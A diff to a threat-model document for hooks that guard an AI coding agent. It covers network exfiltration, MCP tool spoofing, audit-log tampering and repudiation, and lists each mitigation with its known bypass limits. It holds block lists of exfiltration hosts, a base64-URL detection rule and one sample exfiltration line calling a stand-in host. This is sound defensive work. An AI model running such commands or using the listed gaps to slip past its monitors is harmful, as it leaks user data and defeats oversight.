@@ -1,6 +1,6 @@
 # Threat Model
 
-> Status: Plans 1-3 covered. T-001 through T-009 documented; T-004 fully covered. T-010 to T-018 populate as their hooks ship in Plans 4-5.
+> Status: Plans 1-4 covered. T-001 through T-009 plus T-013 through T-017 documented. T-004 and T-005 fully covered as of Plan 4. T-010 through T-012 and T-018 populate as their hooks ship in Plan 5.
 
 ## Trust Boundaries
 
@@ -61,16 +61,17 @@
 - **Coverage:** baseline (warn), strict (block), regulated (block). Fully covered as of Plan 3.
 - **Known limitations:** detection relies on argument string matching; obfuscated invocations (aliases, function wrappers, env-set flags) may bypass. The amend guard cannot reliably distinguish "already pushed" from "local-only" amends; it warns on every amend.
 
-### T-005: Supply Chain via Submodule
+### T-005: Network Exfil via WebFetch and Bash
 
-- **Vector:** Edit, Write, Bash (git CLI)
-- **STRIDE:** Tampering, Supply Chain
-- **Agentic Top 10:** A3 Supply Chain Attacks
+- **Vector:** WebFetch, Bash (curl, wget, fetch)
+- **STRIDE:** Information Disclosure, Exfiltration
+- **Agentic Top 10:** A4 Sensitive Information Disclosure, A6 Excessive Agency
 - **Default mitigations:**
-  - `submodule-injection-guard` (PreToolUse, block) blocks Edit/Write to any `.gitmodules` file and Bash invocations of `git submodule add` or `git submodule update`.
-  - Deny patterns in `overlays/branch-guards.json` enforce the boundary at the permission layer (Edit/Write on `*.gitmodules`).
-- **Coverage:** baseline, strict, regulated.
-- **Known limitations:** does not inspect submodule URLs for trust; trust is binary (block any add/update). Existing submodules already in the working tree are not blocked from being inspected. `git submodule status` and read-only operations pass through.
+  - `webfetch-egress-guard` (PreToolUse, block all profiles) deny-by-default hostname allowlist for WebFetch. Blocks IP literals, DNS-over-HTTPS hosts, and any hostname not in the allowlist (`docs.anthropic.com`, `github.com`, `raw.githubusercontent.com`, `api.github.com`, `developer.mozilla.org`, `nodejs.org`, `registry.npmjs.org`, `pypi.org`).
+  - `bash-egress-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) parses `curl`, `wget`, `fetch` invocations and applies the same allowlist plus an always-block list (`pastebin.com`, `transfer.sh`, `paste.ee`, `requestbin.com`). Also detects base64-encoded HTTP URLs (`aHR0c...`) as exfil obfuscation.
+  - Deny patterns in `overlays/network-egress.json` enforce the same exfil-target list at the permission layer for both `WebFetch(*)` and `Bash(curl|wget *)`.
+- **Coverage:** baseline (bash-egress=warn, webfetch-egress=block), strict (both block), regulated (both block). Fully covered as of Plan 4.
+- **Known limitations:** does not inspect request bodies; a request to an allowlisted host can still exfil through a URL or POST body. New exfil-target hosts require updating the always-block list. Tor / onion routing not specifically addressed.
 
 ### T-006: Pipe-to-Shell Remote Execution
 
@@ -115,6 +116,64 @@
   - `bash-structural-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) detects `command_substitution` (`$(...)` and backticks) and `process_substitution` (`<(...)` and `>(...)`) as structural risk kinds. Also flags unicode-lookalike dollar (U+FF04).
 - **Coverage:** baseline (warn), strict (block), regulated (block).
 - **Known limitations:** the parser does not evaluate substitutions; it only detects their syntactic presence. A benign `echo $(date)` is flagged the same as `echo $(curl evil.com/key)`. Users on baseline see warnings; users on strict/regulated need to refactor to direct invocations or whitelist via configuration.
+
+### T-013: Supply Chain via Submodule
+
+- **Vector:** Edit, Write, Bash (git CLI)
+- **STRIDE:** Tampering, Supply Chain
+- **Agentic Top 10:** A3 Supply Chain Attacks
+- **Default mitigations:**
+  - `submodule-injection-guard` (PreToolUse, block) blocks Edit/Write to any `.gitmodules` file and Bash invocations of `git submodule add` or `git submodule update`. The hook manifest still uses the legacy threat ID `T-005-supply-chain-submodule`; full ID alignment is tracked for a future cleanup plan.
+  - Deny patterns in `overlays/branch-guards.json` enforce the boundary at the permission layer (Edit/Write on `*.gitmodules`).
+- **Coverage:** baseline, strict, regulated.
+- **Known limitations:** does not inspect submodule URLs for trust; trust is binary (block any add/update). Existing submodules already in the working tree are not blocked from being inspected. `git submodule status` and read-only operations pass through.
+
+### T-014: Tool Spoofing via MCP
+
+- **Vector:** MCP (rogue server registration, name collision with built-in tools)
+- **STRIDE:** Spoofing
+- **Agentic Top 10:** A8 Repudiation / Untraceability (proxy / impersonation surface)
+- **Default mitigations:** PARTIAL.
+  - `mcp-secret-guard` (PreToolUse, block) scans MCP tool input payloads for secret literals. Limits exfil through a spoofed tool but does not prevent the spoof itself.
+  - Audit-log records every MCP invocation, so a compromised or impersonating MCP server leaves a forensic trail.
+- **Coverage:** baseline, strict, regulated (partial coverage only).
+- **Known limitations:** there is no provenance check on MCP server identity. A malicious local config that registers a server named identically to a trusted one would still be honored. Full mitigation (signature pinning or MCP allowlist) is deferred to a later plan.
+
+### T-015: Audit Log Tampering
+
+- **Vector:** Filesystem (direct edit, sed/echo append, file replacement)
+- **STRIDE:** Tampering
+- **Agentic Top 10:** A6 Excessive Agency
+- **Default mitigations:**
+  - `audit-tamper-detector` (PostToolUse, severity warn on baseline / block on strict and regulated) runs `AuditLogger.verify()` on every PostToolUse event. Detects `prev-hash-mismatch`, `hash-mismatch`, and `invalid-json` corruption.
+  - SHA-256 hash chain in `AuditLogger`: each record's `prev_hash` references the previous record's `hash`, so any insertion, deletion, or mutation of a prior record breaks the chain.
+  - In-process write queue (Plan 4 hardening) prevents accidental chain breakage from concurrent writers in the same process.
+  - `AuditLogger.verify()` returns `{ ok: true, records: 0 }` for missing files (defined empty-state semantics) and `{ ok: false, brokenAt: i, reason: 'invalid-json' }` for unparseable lines.
+- **Coverage:** baseline (warn), strict (block), regulated (block).
+- **Known limitations:** cross-process tampering (a separate process modifying the file while the runner is mid-write) can race; per-PID log files or `flock`-based locking is tracked for a future plan. An attacker with write access can also delete the entire log; the hook only flags chain breakage, not absence.
+
+### T-016: Hook DoS / Runaway Timeout
+
+- **Vector:** Hook implementation (slow regex, unbounded loop, network call inside hook)
+- **STRIDE:** Denial of Service
+- **Agentic Top 10:** A5 Cascading Reliability Failure
+- **Default mitigations:**
+  - The Plan 1 runner enforces a per-hook timeout via `AbortController` (default 1500ms; per-hook override via `manifest.timeout_ms`). A hook that exceeds its budget is aborted; the invocation is recorded with outcome `timeout` and the runner continues with the next hook.
+  - Manifest schema validates `timeout_ms` and refuses to load hooks declaring excessive values.
+- **Coverage:** baseline, strict, regulated (already mitigated as of Plan 1; documented here for completeness).
+- **Known limitations:** a hook that hits its timeout still consumes the budget once; repeated invocations of a slow hook can accumulate latency. CPU-bound regex backtracking inside a hook is bounded by the timeout but can degrade UX on every event.
+
+### T-017: Repudiation of Risky Action
+
+- **Vector:** Any tool invocation that triggers a hook decision
+- **STRIDE:** Repudiation
+- **Agentic Top 10:** A6 Excessive Agency, A8 Repudiation / Untraceability
+- **Default mitigations:**
+  - Every hook invocation is appended to the audit log with `ts`, `hook`, `tool`, `decision`, `reason`, `duration_ms`, and SHA-256 hash chain.
+  - `audit-session-summary` (SubagentStop, log all profiles) emits a single forensic summary record per subagent session containing aggregate counts (total events, blocks, warns, allows, timeouts, errors) and the hash of the last verified record.
+  - `AuditLogger.verify()` provides on-demand integrity checks for after-the-fact audits.
+- **Coverage:** baseline, strict, regulated.
+- **Known limitations:** the audit log lives on the local filesystem; central log shipping is out of scope for Plan 4. Without external archival, an attacker with root access can delete the entire log in one operation.
 
 ## Explicit Non-Goals
 
